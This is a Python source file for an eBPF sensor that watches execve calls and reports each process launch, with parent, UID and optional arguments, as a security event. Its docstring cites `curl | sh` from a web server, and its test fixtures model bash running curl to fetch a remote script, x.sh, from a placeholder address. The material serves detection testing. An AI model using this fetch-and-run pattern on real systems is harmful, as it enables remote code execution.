"""eBPF process-execution sensor.

Attaches to the ``execve`` syscall tracepoint and reports every process
execution, with its parent, as a normalized ``process_start`` event.

Why this is worth having on top of logs: journald only hears about a process if
something chooses to log it.  ``curl | sh`` started from a web server writes
nothing to any log file, and that is precisely the execution worth seeing.

The kernel side does the filtering it can (own PID, optional UID filter) and
copies a bounded amount of data per event, so userspace stays cheap.

Privacy: command-line arguments can contain secrets (a password passed on a
command line, a token in a URL).  Argument capture is therefore *compiled out*
of the BPF program with ``capture_args=False`` -- the data is then never read
in the kernel at all, not merely dropped later.
"""

from __future__ import annotations

import ctypes
import logging
from types import SimpleNamespace
from typing import Iterator

from ...models.event import EventType, SecurityEvent, Severity, format_timestamp
from ..base import Sensor, SensorStatus, SensorUnavailableError
from .loader import BootClock, check_ebpf_support, load_bpf, privilege_remedy

LOGGER = logging.getLogger(__name__)

#: Bounded per-event buffers.  Bigger values cost kernel stack and perf-buffer
#: bandwidth on every exec, so they stay small on purpose.
ARGSIZE = 64
MAX_ARGS = 5

#: ``TASK_COMM_LEN`` from ``<linux/sched.h>``, the size ``comm``/``pcomm`` are
#: declared with in the BPF program below.  It is a kernel ABI constant, not
#: ours to change.
TASK_COMM_LEN = 16

# A kprobe on the execve syscall rather than a tracepoint: BCC generates
# tracepoint argument structs by reading /sys/kernel/tracing/events/.../format,
# which is root-only, so a kprobe keeps this program compilable (and therefore
# testable) without privileges.  Attaching still requires them.
BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#define ARGSIZE  __ARGSIZE__
#define MAX_ARGS __MAX_ARGS__

struct exec_event_t {
    u64 ts;
    u32 pid;
    u32 ppid;
    u32 uid;
    u32 gid;
    int nargs;
    char comm[TASK_COMM_LEN];
    char pcomm[TASK_COMM_LEN];
    char filename[ARGSIZE * 2];
    char argv[MAX_ARGS][ARGSIZE];
};

BPF_PERF_OUTPUT(exec_events);
/* One scratch slot per CPU: the event is far too big for the BPF stack. */
BPF_PERCPU_ARRAY(scratch, struct exec_event_t, 1);

int syscall__execve(struct pt_regs *ctx,
                    const char __user *filename,
                    const char __user *const __user *__argv,
                    const char __user *const __user *__envp)
{
    u32 zero = 0;
    struct exec_event_t *data = scratch.lookup(&zero);
    if (data == 0)
        return 0;

    u64 id = bpf_get_current_pid_tgid();
    u32 pid = id >> 32;

    /* Never report our own execs: that would be a feedback loop. */
#ifdef SELF_PID
    if (pid == SELF_PID)
        return 0;
#endif

    u64 uid_gid = bpf_get_current_uid_gid();
    u32 uid = uid_gid & 0xFFFFFFFF;
#ifdef FILTER_UID
    if (uid != FILTER_UID)
        return 0;
#endif

    data->ts = bpf_ktime_get_ns();
    data->pid = pid;
    data->uid = uid;
    data->gid = uid_gid >> 32;
    data->nargs = 0;
    data->filename[0] = 0;
    data->pcomm[0] = 0;
    data->ppid = 0;

    bpf_get_current_comm(&data->comm, sizeof(data->comm));

    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    struct task_struct *parent = NULL;
    bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent);
    if (parent != NULL) {
        bpf_probe_read_kernel(&data->ppid, sizeof(data->ppid), &parent->tgid);
        bpf_probe_read_kernel_str(&data->pcomm, sizeof(data->pcomm), parent->comm);
    }

    bpf_probe_read_user_str(&data->filename, sizeof(data->filename), (void *)filename);

#ifdef CAPTURE_ARGS
    /* Bounded, unrolled: the verifier requires a compile-time loop bound, and a
       small MAX_ARGS keeps the per-event copy cost fixed. */
    #pragma unroll
    for (int i = 0; i < MAX_ARGS; i++) {
        const char *argp = NULL;
        bpf_probe_read_user(&argp, sizeof(argp), &__argv[i]);
        if (argp == NULL)
            break;
        bpf_probe_read_user_str(&data->argv[i], ARGSIZE, argp);
        data->nargs = i + 1;
    }
#endif

    exec_events.perf_submit(ctx, data, sizeof(*data));
    return 0;
}
"""


def build_program(capture_args: bool = True) -> str:
    """Render the BPF C source with its compile-time constants filled in."""
    return BPF_PROGRAM.replace("__ARGSIZE__", str(ARGSIZE)).replace(
        "__MAX_ARGS__", str(MAX_ARGS)
    )


class ExecEvent(ctypes.Structure):
    """Mirrors the C ``struct exec_event_t`` above, field for field.

    BCC's ``PerfEventArray.event()`` can build an equivalent ``ctypes``
    structure on its own, but it does so dynamically at runtime (via
    ``bcc.table._get_event_class``, introspecting BPF map metadata) and that
    path can raise ``SystemExit``.  Defining the layout explicitly here means
    decoding a perf record no longer goes through that machinery at all, and
    any drift from ``exec_event_t`` shows up as a failing layout test instead
    of a runtime surprise.
    """

    _fields_ = [
        ("ts", ctypes.c_uint64),
        ("pid", ctypes.c_uint32),
        ("ppid", ctypes.c_uint32),
        ("uid", ctypes.c_uint32),
        ("gid", ctypes.c_uint32),
        ("nargs", ctypes.c_int),
        ("comm", ctypes.c_char * TASK_COMM_LEN),
        ("pcomm", ctypes.c_char * TASK_COMM_LEN),
        ("filename", ctypes.c_char * (ARGSIZE * 2)),
        ("argv", (ctypes.c_char * ARGSIZE) * MAX_ARGS),
    ]


def decode_exec_record(data, size: int) -> ExecEvent:
    """Cast one raw perf-buffer record to :class:`ExecEvent`.

    ``data`` is whatever the perf-buffer callback handed us: in production, an
    address (an ``int``, as BCC's ``ctypes.CFUNCTYPE`` callback delivers a
    ``c_void_p`` argument); in tests, anything ``ctypes.cast`` accepts,
    including a plain ``bytes`` buffer. ``size`` is the number of bytes the
    kernel says it submitted. A record shorter than ``ExecEvent`` is rejected
    up front rather than read out of bounds.
    """
    expected = ctypes.sizeof(ExecEvent)
    if not data or size < expected:
        raise ValueError(f"truncated exec record: {size} bytes, need {expected}")
    return ctypes.cast(data, ctypes.POINTER(ExecEvent)).contents


def _text(value) -> str | None:
    """Decode a NUL-terminated kernel buffer into text, or ``None`` when empty."""
    if value is None:
        return None
    if isinstance(value, ctypes.Array):
        value = bytes(value)
    if isinstance(value, (bytes, bytearray)):
        value = bytes(value).split(b"\x00", 1)[0].decode("utf-8", errors="replace")
    value = str(value).strip()
    return value or None


def decode_process_event(
    raw,
    host: str = "unknown",
    source: str = "ebpf",
    clock: BootClock | None = None,
    user_lookup=None,
) -> SecurityEvent:
    """Turn one raw kernel exec record into a normalized event.

    ``raw`` is whatever the perf buffer produced -- a ``ctypes`` structure at
    runtime, a simple object in tests.  Every field is read defensively: a
    kernel that does not provide one simply yields ``None``, never a guess.
    """
    uid = getattr(raw, "uid", None)
    user = None
    if user_lookup is not None and uid is not None:
        user = user_lookup(uid)

    executable = _text(getattr(raw, "filename", None))
    comm = _text(getattr(raw, "comm", None))
    parent = _text(getattr(raw, "pcomm", None))

    argv = []
    raw_argv = getattr(raw, "argv", None) or []
    nargs = getattr(raw, "nargs", None)
    if nargs is None:
        nargs = len(raw_argv)
    for index in range(min(int(nargs or 0), len(raw_argv))):
        decoded = _text(raw_argv[index])
        if decoded:
            argv.append(decoded)
    command_line = " ".join(argv) if argv else None

    process = None
    if executable:
        process = executable.rsplit("/", 1)[-1]
    process = process or comm

    timestamp = None
    ktime = getattr(raw, "ts", None)
    if clock is not None:
        timestamp = format_timestamp(clock.to_datetime(ktime))

    metadata = {
        "pid": _int(getattr(raw, "pid", None)),
        "ppid": _int(getattr(raw, "ppid", None)),
        "uid": _int(uid),
        "gid": _int(getattr(raw, "gid", None)),
        "executable": executable,
        "command_line": command_line,
        "process_name": comm,
        "parent_process": parent,
    }
    if len(argv) >= MAX_ARGS:
        metadata["args_truncated"] = True

    message = f"Process executed: {command_line or executable or process or 'unknown'}"
    event = SecurityEvent(
        host=host,
        source=source,
        event_type=EventType.PROCESS_START,
        severity=Severity.INFO,
        user=user,
        process=process,
        message=message,
        raw=message,
        metadata={key: value for key, value in metadata.items() if value is not None},
    )
    if timestamp:
        event.timestamp = timestamp
    return event


def _int(value):
    try:
        return int(value)
    except (TypeError, ValueError):
        return None


def resolve_user(uid: int, _cache: dict = {}) -> str | None:
    """Map a UID to a username, cached.  Returns ``None`` for unknown UIDs."""
    if uid in _cache:
        return _cache[uid]
    try:
        import pwd

        name = pwd.getpwuid(int(uid)).pw_name
    except (KeyError, ValueError, TypeError, ImportError, OSError):
        name = None
    _cache[uid] = name
    return name


class EbpfProcessSensor(Sensor):
    """Reports every ``execve`` on the host, with parent process metadata.

    Args:
        capture_args: Capture command-line arguments.  Set to ``False`` and the
            BPF program is compiled without argument reads at all.
        uid: Only report executions by this UID (kernel-side filter).
        poll_timeout_ms: How long each perf-buffer poll waits; also how quickly
            :meth:`stop` takes effect.
        host: Hostname stamped on events.
    """

    name = "ebpf-process"
    description = "Process executions (execve) with parent lineage, via eBPF"
    source = "ebpf"

    def __init__(
        self,
        capture_args: bool = True,
        uid: int | None = None,
        poll_timeout_ms: int = 200,
        host: str | None = None,
    ) -> None:
        super().__init__(host=host)
        self.capture_args = capture_args
        self.uid = uid
        self.poll_timeout_ms = poll_timeout_ms
        self._bpf = None
        self._clock: BootClock | None = None
        self._queue: list[SecurityEvent] = []
        self.events_seen = 0
        self.events_dropped = 0

    @classmethod
    def status(cls) -> SensorStatus:
        support = check_ebpf_support()
        return SensorStatus(
            name=cls.name,
            available=support.supported,
            reason=support.reason,
            remedy=support.remedy,
            details=support.details,
        )

    def cflags(self) -> list[str]:
        """Compile-time switches: self-filter, optional UID filter, arg capture."""
        import os

        flags = [f"-DSELF_PID={os.getpid()}"]
        if self.capture_args:
            flags.append("-DCAPTURE_ARGS=1")
        if self.uid is not None:
            flags.append(f"-DFILTER_UID={int(self.uid)}")
        return flags

    def start(self) -> None:
        if self._bpf is not None:  # pragma: no cover - defensive
            return
        support = check_ebpf_support()
        if not support.supported:
            raise SensorUnavailableError(
                support.reason or "eBPF is unavailable",
                support.remedy or privilege_remedy(f"sentinelforge sensor start {self.name}"),
            )
        self._clock = BootClock()
        self._bpf = load_bpf(build_program(self.capture_args), self.cflags())
        # The syscall symbol is arch- and kernel-dependent (__x64_sys_execve on
        # x86_64); BCC resolves the right name for this machine.
        self._bpf.attach_kprobe(
            event=self._bpf.get_syscall_fnname("execve"), fn_name="syscall__execve"
        )
        self._bpf["exec_events"].open_perf_buffer(
            self._handle_event, page_cnt=64, lost_cb=self._handle_lost
        )
        super().start()
        LOGGER.info("eBPF process sensor attached (args=%s)", self.capture_args)

    def stop(self) -> None:
        super().stop()
        if self._bpf is not None:
            try:
                self._bpf.cleanup()
            except Exception as exc:  # pragma: no cover - best effort detach
                LOGGER.warning("error detaching eBPF process sensor: %s", exc)
            self._bpf = None
        self._queue.clear()

    def _handle_event(self, cpu, data, size) -> None:
        # Reading the perf record is itself fallible (a truncated or unexpected
        # record), so it belongs inside the guard: a bad record from the kernel
        # must never end the poll loop.  Decoding is a direct ctypes cast
        # against the fixed ExecEvent layout, not BCC's PerfEventArray.event()
        # (which builds its structure dynamically and can raise SystemExit) --
        # a normal exec record no longer goes near that path at all.
        try:
            raw = decode_exec_record(data, size)
            event = decode_process_event(
                raw,
                host=self.host,
                source=self.source,
                clock=self._clock,
                user_lookup=resolve_user,
            )
        except Exception as exc:  # a malformed record must not kill the sensor
            LOGGER.warning("skipping unreadable exec record: %s", exc)
            return
        self.events_seen += 1
        self._queue.append(event)

    def _handle_lost(self, count) -> None:
        """The kernel dropped events because userspace could not keep up."""
        self.events_dropped += int(count)
        LOGGER.warning("eBPF process sensor: kernel dropped %s event(s)", count)

    def events(self) -> Iterator[SecurityEvent]:
        if not self.running:
            self.start()
        while self.running:
            try:
                self._bpf.perf_buffer_poll(timeout=self.poll_timeout_ms)
            except KeyboardInterrupt:  # pragma: no cover - interactive
                return
            except Exception as exc:  # pragma: no cover - runtime kernel error
                LOGGER.error("eBPF poll failed: %s", exc)
                return
            while self._queue:
                yield self._queue.pop(0)


def synthetic_record(**overrides) -> SimpleNamespace:
    """Build a raw-record stand-in for tests (no kernel required)."""
    record = SimpleNamespace(
        ts=0,
        pid=4101,
        ppid=4100,
        uid=1000,
        gid=1000,
        nargs=2,
        comm=b"curl\x00\x00",
        pcomm=b"bash\x00",
        filename=b"/usr/bin/curl\x00",
        argv=[b"curl\x00", b"http://198.51.100.9/x.sh\x00", b"\x00", b"\x00", b"\x00"],
    )
    for key, value in overrides.items():
        setattr(record, key, value)
    return record


def synthetic_exec_event(**overrides) -> ExecEvent:
    """Build a real, populated :class:`ExecEvent` for tests that exercise the
    manual wire-format decoder end to end, mirroring :func:`synthetic_record`'s
    default field values so the two can be asserted against identically.
    """
    fields = dict(
        ts=0,
        pid=4101,
        ppid=4100,
        uid=1000,
        gid=1000,
        nargs=2,
        comm=b"curl",
        pcomm=b"bash",
        filename=b"/usr/bin/curl",
        argv=[b"curl", b"http://198.51.100.9/x.sh"],
    )
    fields.update(overrides)
    argv = fields.pop("argv")

    event = ExecEvent(
        ts=fields["ts"],
        pid=fields["pid"],
        ppid=fields["ppid"],
        uid=fields["uid"],
        gid=fields["gid"],
        nargs=fields["nargs"],
        comm=fields["comm"],
        pcomm=fields["pcomm"],
        filename=fields["filename"],
    )
    for index, value in enumerate(argv[:MAX_ARGS]):
        event.argv[index].value = value
    return event
